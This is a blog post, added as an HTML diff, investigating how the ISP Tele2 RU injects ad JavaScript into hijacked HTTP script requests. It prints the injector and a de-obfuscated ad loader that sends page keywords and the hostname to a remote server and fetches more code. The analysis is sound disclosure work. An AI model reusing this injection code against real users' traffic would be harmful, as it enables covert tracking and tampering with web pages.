@@ -1,0 +1,190 @@
+<!doctype html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1"> <!-- stupid mobile browsers -->
+		<title>Tele2 RU hijacks HTTP connections</title>
+		<style>
+			body {
+				max-width: 42em;
+			}
+			.center {
+				text-align: center;
+				display: block;
+				margin-left: auto;
+				margin-right: auto;
+			}
+		</style>
+		<link href="/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed">
+	</head>
+	<body>
+		<h1>Tele2 RU hijacks HTTP connections</h1>
+		<div class="content">
+			<p>In other news, water is wet, sky has a bluish colour, and 2 + 2 = 4.</p>
+
+<p>I deployed an HTTP website<sup><a href="#fn1">1</a></sup> and wanted to check whether it works. One of the first things I noticed was that it loaded third-party JavaScript from a domain name that looked like an ad network:</p>
+
+<p><img src="umatrix.png" alt="" class="center"></p>
+
+<p>Third-party JavaScript ads? On <em>my</em> website? Inconceivable! I must investigate this at once!</p>
+
+<p>I'll skip a few false starts; it took me a while to notice that while the original HTML code of the page has arrived intact, the <code>ui.js</code> file containing the code for the interactive part of the page was sometimes downloaded twice per page load:</p>
+
+<p><img src="requests.png" alt="" class="center">
+<img src="requests2.png" alt="" class="center"></p>
+
+<p>And this 725-byte file that arrived without a header indentifying my Web server, prohibited caching and also had <code>Connection: close</code>? That's definitely not mine. It doesn't happen all the time; if I request the same URL repeatedly, I eventually start getting the original content, but every once in a while a new <code>HTTP GET</code> request for a path ending in <code>.js</code> is hijacked to return something completely different instead:</p>
+
+
+
+<pre>
+$ curl -s http://example.org/whatever.js | zcat | python3 -c 'import jsbeautifier; jsbeautifier.main()' -
+! function() {
+    function t() {
+        try {
+            return window.self !== window.top
+        } catch (t) {
+            return !0
+        }
+    }
+
+    function e() {
+        var t = document.getElementsByTagName(&quot;head&quot;)[0],
+            e = document.createElement(&quot;script&quot;);
+        e.src = &quot;http://p.tlrtb.com/ad/base.js?&quot;, e.type = &quot;text/javascript&quot;, t.appendChild(e)
+    }
+
+    function n(t) {
+        o.parentNode.insertBefore(t, o.nextSibling)
+    }
+
+    function r(t) {
+        document.write(t.outerHTML)
+    }
+
+    function c() {
+        for (var t = document.createElement(&quot;script&quot;), e = Array.prototype.slice.call(o.attributes), n = 0; n &lt; e.length; n++) t.setAttribute(e[n].nodeName, e[n].nodeValue);
+        return t.src = &quot;http://example.org/whatever.js?&quot;, t
+    }
+    var o = document.currentScript || document.scripts[document.scripts.length - 1],
+        i = c();
+    o.async || o.defer ? n(i) : r(i), window.__qsrad || t() || (window.__qsrad = 1, e())
+}();
+$ torify curl -sI http://example.org/whatever.js | head -n 1
+HTTP/1.1 404 Not Found
+</pre>
+
+
+
+<p>Note that the original <code>.js</code> is transparently fetched by appending a <code>?</code> to the URL. I'm tempted to add an <code>?</code> to all script URLs on my own website, just out of spite. Also note that a random Tor exit node (that's usually interested in conducting all sorts of shenanigans on plain-text traffic passing through it) returns the original content of the URL, while my own ISP (that's supposed to be interested in passing the traffic unaffected because I'm paying them money) does not!</p>
+
+<p>What does this <code>http://p.tlrtb.com/ad/base.js</code> do that Tele2RU wants to inject into my pages so much? After some manual de-obfuscation, here's what I ended up with:</p>
+
+
+
+<pre>
+<span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">function</span><span style="color:#000000">() {</span>
+    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">get_keywords</span><span style="color:#000000">() {</span>
+        <span style="color:#000000; font-weight:bold">var</span> metas <span style="color:#000000">= [</span>
+            <span style="color:#bf0303">&quot;keywords&quot;</span><span style="color:#000000">,</span>
+            <span style="color:#bf0303">&quot;description&quot;</span>
+        <span style="color:#000000">];</span>
+        <span style="color:#000000; font-weight:bold">var</span> keywords <span style="color:#000000">= [];</span>
+
+        <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">words</span><span style="color:#000000">(</span>str<span style="color:#000000">) {</span>
+            <span style="color:#000000; font-weight:bold">return</span> str<span style="color:#000000">.</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">/[^a-zA-Z0-9а-яА-Я-ёЁ ]+/g</span><span style="color:#000000">,</span> <span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">).</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">/\s\s+/g</span><span style="color:#000000">,</span> <span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">).</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot; - &quot;</span><span style="color:#000000">,</span> <span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">).</span><span style="color:#010181">trim</span><span style="color:#000000">().</span><span style="color:#010181">split</span><span style="color:#000000">(</span><span style="color:#bf0303">'</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">'</span><span style="color:#000000">);</span>
+        <span style="color:#000000">}</span>
+        <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>document<span style="color:#000000">.</span>title<span style="color:#000000">) {</span>
+            keywords <span style="color:#000000">=</span> keywords<span style="color:#000000">.</span><span style="color:#010181">concat</span><span style="color:#000000">(</span><span style="color:#010181">words</span><span style="color:#000000">(</span>document<span style="color:#000000">.</span>title<span style="color:#000000">));</span>
+        <span style="color:#000000">}</span>
+        <span style="color:#000000; font-weight:bold">var</span> meta_tags <span style="color:#000000">=</span> document<span style="color:#000000">.</span><span style="color:#010181">getElementsByTagName</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;meta&quot;</span><span style="color:#000000">);</span>
+        <span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">var</span> i <span style="color:#000000">=</span> <span style="color:#b07e00">0</span><span style="color:#000000">;</span> i <span style="color:#000000">&lt;</span> meta_tags<span style="color:#000000">.</span>length<span style="color:#000000">;</span> i<span style="color:#000000">++) {</span>
+            <span style="color:#000000; font-weight:bold">var</span> mtag <span style="color:#000000">=</span> meta_tags<span style="color:#000000">[</span>i<span style="color:#000000">];</span>
+            <span style="color:#000000; font-weight:bold">var</span> mname <span style="color:#000000">=</span> mtag<span style="color:#000000">.</span><span style="color:#010181">getAttribute</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;name&quot;</span><span style="color:#000000">);</span>
+            <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>mname <span style="color:#000000">&amp;&amp; (</span>metas<span style="color:#000000">.</span><span style="color:#010181">indexOf</span><span style="color:#000000">(</span>mname<span style="color:#000000">.</span><span style="color:#010181">toLowerCase</span><span style="color:#000000">()) != -</span><span style="color:#b07e00">1</span><span style="color:#000000">)) {</span>
+                keywords <span style="color:#000000">=</span> keywords<span style="color:#000000">.</span><span style="color:#010181">concat</span><span style="color:#000000">(</span><span style="color:#010181">words</span><span style="color:#000000">(</span>mtag<span style="color:#000000">.</span><span style="color:#010181">getAttribute</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;content&quot;</span><span style="color:#000000">)));</span>
+            <span style="color:#000000">}</span>
+        <span style="color:#000000">}</span>
+        <span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">var</span> i <span style="color:#000000">=</span> <span style="color:#b07e00">0</span><span style="color:#000000">;</span> i <span style="color:#000000">&lt;</span> keywords<span style="color:#000000">[</span><span style="color:#bf0303">&quot;length&quot;</span><span style="color:#000000">];</span> i<span style="color:#000000">++) {</span>
+            <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>keywords<span style="color:#000000">[</span>i<span style="color:#000000">].</span>length <span style="color:#000000">&gt;</span> <span style="color:#b07e00">40</span><span style="color:#000000">) {</span>
+                keywords<span style="color:#000000">[</span>i<span style="color:#000000">] =</span> keywords<span style="color:#000000">[</span>i<span style="color:#000000">].</span><span style="color:#010181">substr</span><span style="color:#000000">(</span><span style="color:#b07e00">0</span><span style="color:#000000">,</span> <span style="color:#b07e00">40</span><span style="color:#000000">);</span>
+            <span style="color:#000000">}</span>
+        <span style="color:#000000">}</span>
+        <span style="color:#000000; font-weight:bold">var</span> ret <span style="color:#000000">=</span> <span style="color:#bf0303">''</span><span style="color:#000000">;</span>
+        <span style="color:#000000; font-weight:bold">for</span> <span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">var</span> i <span style="color:#000000">=</span> <span style="color:#b07e00">1</span><span style="color:#000000">;</span> i <span style="color:#000000">&lt;</span> keywords<span style="color:#000000">.</span>length <span style="color:#000000">+</span> <span style="color:#b07e00">1</span><span style="color:#000000">;</span> i<span style="color:#000000">++) {</span>
+            <span style="color:#000000; font-weight:bold">var</span> slice <span style="color:#000000">=</span> keywords<span style="color:#000000">.</span><span style="color:#010181">slice</span><span style="color:#000000">(</span><span style="color:#b07e00">0</span><span style="color:#000000">,</span> i<span style="color:#000000">);</span>
+            <span style="color:#000000; font-weight:bold">var</span> squeezed <span style="color:#000000">=</span> slice<span style="color:#000000">[</span><span style="color:#bf0303">&quot;join&quot;</span><span style="color:#000000">](</span><span style="color:#bf0303">','</span><span style="color:#000000">);</span>
+            <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>squeezed<span style="color:#000000">.</span>length <span style="color:#000000">&lt;=</span> <span style="color:#b07e00">200</span><span style="color:#000000">) {</span>
+                ret <span style="color:#000000">=</span> squeezed<span style="color:#000000">;</span>
+            <span style="color:#000000">}</span>
+        <span style="color:#000000">}</span>
+
+        <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">hostname</span><span style="color:#000000">() {</span>
+            <span style="color:#000000; font-weight:bold">return</span> <span style="color:#bf0303">&quot;,%%&quot;</span> <span style="color:#000000">+</span> window<span style="color:#000000">.</span>location<span style="color:#000000">.</span>hostname<span style="color:#000000">.</span><span style="color:#010181">replace</span><span style="color:#000000">(</span><span style="color:#000000; font-weight:bold">/\./g</span><span style="color:#000000">,</span> <span style="color:#bf0303">'%'</span><span style="color:#000000">) +</span> <span style="color:#bf0303">'%%'</span><span style="color:#000000">;</span>
+        <span style="color:#000000">}</span>
+        <span style="color:#000000; font-weight:bold">return</span> ret<span style="color:#000000">.</span><span style="color:#010181">trim</span><span style="color:#000000">() +</span> <span style="color:#010181">hostname</span><span style="color:#000000">();</span>
+    <span style="color:#000000">}</span>
+
+    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">load_script</span><span style="color:#000000">(</span>src<span style="color:#000000">) {</span>
+        <span style="color:#000000; font-weight:bold">var</span> script <span style="color:#000000">=</span> document<span style="color:#000000">.</span><span style="color:#010181">createElement</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;script&quot;</span><span style="color:#000000">);</span>
+        script<span style="color:#000000">.</span>src <span style="color:#000000">=</span> src<span style="color:#000000">;</span>
+        <span style="color:#000000; font-weight:bold">var</span> last_script <span style="color:#000000">=</span> document<span style="color:#000000">.</span>currentScript <span style="color:#000000">||</span> document<span style="color:#000000">.</span>scripts<span style="color:#000000">[</span>document<span style="color:#000000">.</span>scripts<span style="color:#000000">.</span>length <span style="color:#000000">-</span> <span style="color:#b07e00">1</span><span style="color:#000000">];</span>
+        last_script<span style="color:#000000">.</span>parentNode<span style="color:#000000">.</span><span style="color:#010181">insertBefore</span><span style="color:#000000">(</span>script<span style="color:#000000">,</span> last_script<span style="color:#000000">.</span>nextSibling<span style="color:#000000">);</span>
+    <span style="color:#000000">}</span>
+
+    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">utcoffset</span><span style="color:#000000">() {</span>
+        <span style="color:#000000; font-weight:bold">return</span> <span style="color:#000000">-</span><span style="color:#000000; font-weight:bold">new</span> <span style="color:#010181">Date</span><span style="color:#000000">().</span><span style="color:#010181">getTimezoneOffset</span><span style="color:#000000">();</span>
+    <span style="color:#000000">}</span>
+
+    <span style="color:#000000; font-weight:bold">function</span> <span style="color:#010181">make_iframe</span><span style="color:#000000">(</span>uid<span style="color:#000000">) {</span>
+        <span style="color:#000000; font-weight:bold">var</span> div <span style="color:#000000">=</span> document<span style="color:#000000">.</span><span style="color:#010181">createElement</span><span style="color:#000000">(</span><span style="color:#bf0303">&quot;div&quot;</span><span style="color:#000000">);</span>
+        div<span style="color:#000000">.</span>innerHTML <span style="color:#000000">=</span> <span style="color:#bf0303">&quot;&lt;!--Start of Floodlight Tag: Please do not remove Activity name of this tag: sync_activity URL of the webpage &quot;</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">&quot;where the tag is expected to be placed: This tag must be placed between the &lt;body&gt; and &lt;/body&gt; tags, as close as possible &quot;</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">&quot;to the opening tag. Creation Date: 04/22/2020--&gt;&lt;script type=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">text/javascript</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&gt;var axel = Math.random() +</span> <span style="color:#ff00ff">\&quot;\&quot;</span><span style="color:#bf0303">;var a = &quot;</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">&quot;axel * 10000000000000;document.write(&quot;</span> <span style="color:#000000">+</span> <span style="color:#bf0303">'&lt;iframe</span><span style="color:#ff00ff">\x20</span><span style="color:#bf0303">src=</span><span style="color:#ff00ff">\x22</span><span style="color:#bf0303">https://10028645.fls.doubleclick.net/activityi;src=10028645;'</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">'type=syncd0;cat=sync_0;u1='</span> <span style="color:#000000">+</span> uid <span style="color:#000000">+</span> <span style="color:#bf0303">&quot;;dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;npa=;ord=&quot;</span> <span style="color:#000000">+</span> <span style="color:#bf0303">&quot; + a + &quot;</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">&quot;?</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">width=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">height=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">frameborder=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">0</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">style=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">display:none</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&gt;&lt;/iframe&gt;&quot; + &quot;);&lt;/script&gt;&lt;noscript&gt;&lt;iframe src=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&quot;</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">&quot;https://10028645.fls.doubleclick.net/activityi;src=10028645;type=syncd0;cat=sync_0;u1=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&quot;</span> <span style="color:#000000">+</span> uid <span style="color:#000000">+</span> <span style="color:#bf0303">&quot;</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">;dc_lat=;dc_rdid=;&quot;</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">&quot;tag_for_child_directed_treatment=;tfua=;npa=;ord=1?</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">width=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">height=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">1</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">frameborder=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">0</span><span style="color:#ff00ff">\&quot;</span> <span style="color:#bf0303">style=</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">display:none</span><span style="color:#ff00ff">\&quot;</span><span style="color:#bf0303">&quot;</span> <span style="color:#000000">+</span>
+            <span style="color:#bf0303">&quot;&gt;&lt;/iframe&gt;&lt;/noscript&gt;&lt;!-- End of Floodlight Tag: Please do not remove --&gt;&quot;</span><span style="color:#000000">;</span>
+        document<span style="color:#000000">.</span>body<span style="color:#000000">.</span><span style="color:#010181">append</span><span style="color:#000000">(</span>div<span style="color:#000000">);</span>
+    <span style="color:#000000">}</span>
+    <span style="color:#000000; font-weight:bold">var</span> p <span style="color:#000000">=</span> <span style="color:#bf0303">''</span><span style="color:#000000">;</span>
+    <span style="color:#000000; font-weight:bold">var</span> datasync <span style="color:#000000">=</span> <span style="color:#000000; font-weight:bold">false</span><span style="color:#000000">;</span>
+    <span style="color:#000000; font-weight:bold">var</span> uid <span style="color:#000000">=</span> <span style="color:#bf0303">'aIMxoXBLDRyEzMqIjfKa0Q=='</span><span style="color:#000000">;</span>
+    <span style="color:#000000; font-weight:bold">if</span> <span style="color:#000000">(</span>datasync<span style="color:#000000">) {</span>
+        <span style="color:#010181">make_iframe</span><span style="color:#000000">(</span>uid<span style="color:#000000">);</span>
+    <span style="color:#000000">}</span>
+    <span style="color:#000000; font-weight:bold">var</span> adbase_url <span style="color:#000000">=</span> <span style="color:#bf0303">&quot;http://p.tlrtb.com/ad/base.js?&quot;</span> <span style="color:#000000">+ (</span>p <span style="color:#000000">?</span> p <span style="color:#000000">+</span> <span style="color:#bf0303">'&amp;'</span> <span style="color:#000000">:</span> <span style="color:#bf0303">''</span><span style="color:#000000">) +</span> <span style="color:#bf0303">&quot;kw=&quot;</span> <span style="color:#000000">+</span> <span style="color:#010181">encodeURIComponent</span><span style="color:#000000">(</span><span style="color:#010181">get_keywords</span><span style="color:#000000">()) +</span> <span style="color:#bf0303">&quot;&amp;utcoffset=&quot;</span> <span style="color:#000000">+</span> <span style="color:#010181">utcoffset</span><span style="color:#000000">();</span>
+    <span style="color:#010181">load_script</span><span style="color:#000000">(</span>adbase_url<span style="color:#000000">);</span>
+<span style="color:#000000">}());</span>
+</pre>
+
+
+
+<p>Yeah, it takes the hostname of the page you are viewing, the keywords from the title and <code>&lt;meta&gt;</code> tags describing the page for the search engines and sends it off to the same remote server, expecting more JavaScript to load and execute. What does it do then? I tried feeding some data to that address, but only got <code>HTTP 502 Bad Gateway</code> in reply. Perhaps it only returns non-errors on certain keywords it considers especially interesting. Who knows?</p>
+
+<p>Speaking of errors,</p>
+
+
+
+<pre>
+$ curl -I http://example.org/does_not_exist
+HTTP/1.1 301 Moved Permanently
+Location: http://404.services/404/
+$ torify curl -sI http://example.org/does_not_exist | head -n 1
+HTTP/1.1 404 Not Found
+</pre>
+
+
+
+<p>Yes, everybody likes it when they get a page with more ads instead of an honest 404! Not.</p>
+
+<p>Unfortunately, this shameful practice is now considered the norm by mobile ISPs and can only be expected to get worse. Make sure you always have an ad-blocker installed; block unknown third-party resources by default; and yes, use HTTPS. This prevents almost everyone from spying on you... except the page owners themselves and the CDN (something something cloudflare something MITM). But that's another story.</p>
+
+<p id="fn1"><sup>1</sup> Yes, the WWW should be all encrypted (or at least signed), and everyone should beware J. Random Script Kiddie, Jr. with a Wi-Fi pentester toolkit. That's not the point. There are no Wi-Fi attacks in this story.</p>
+		</div>
+		<hr>
+		Unless otherwise specified, contents of this blog are covered by <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> license (or a later version).
+	</body>
+</html>
